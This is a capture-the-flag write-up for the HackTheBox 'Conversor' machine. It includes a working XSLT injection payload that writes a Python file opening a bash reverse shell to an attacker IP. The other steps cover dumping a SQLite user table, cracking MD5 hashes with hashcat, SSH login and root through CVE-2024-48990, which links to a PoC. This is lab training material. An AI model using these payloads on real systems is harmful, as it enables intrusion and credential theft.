# HackTheBox - Conversor
**Youtube video:** https://youtu.be/II9ARfhUb4w
---
## Initial Foothold

**Source Code Analysis:**
```bash
# Download source code from about page
tar -xvf source_code.tar.gz

# Read installation documentation
cat install.md

# Found: /var/www in crontab references
# Check database configuration
# Analyze with Snyk for vulnerabilities
```

---
## XSLT Injection

**Exploit Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:shell="http://exslt.org/common" 
    extension-element-prefixes="shell">
    
    <xsl:template match="/">
        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system('bash -c "bash -i >&amp; /dev/tcp/10.10.14.61/443 0>&amp;1"')
        </shell:document>
    </xsl:template>
</xsl:stylesheet>
```

**Shell as www-data**

---
## Lateral Movement (www-data → user)

**SQLite Database Enumeration:**
```bash
# Access database
sqlite3 instance/users.db

# List tables
.tables

# Extract user credentials
select * from users;
```

**Crack Password Hash:**
```bash
# Crack MD5 hash
hashcat -m 0 hash.txt $rockyou
```

**SSH Access:**
```bash
# Login with cracked credentials
ssh user@conversor.htb
```

---
## Privilege Escalation (user → root)

**Sudo Enumeration:**
```bash
# Check sudo privileges
sudo -l

# [Check GTFOBins if you could add the flags]
# Found: -c flag with privesc.perl

# Download template XSLT and check version
```

**Exploit:** CVE-2024-48990 - needrestart Privilege Escalation
- **Payload:** https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing
```bash
# Compile exploit on attacker machine
# Transfer to target
# Run exploit
```
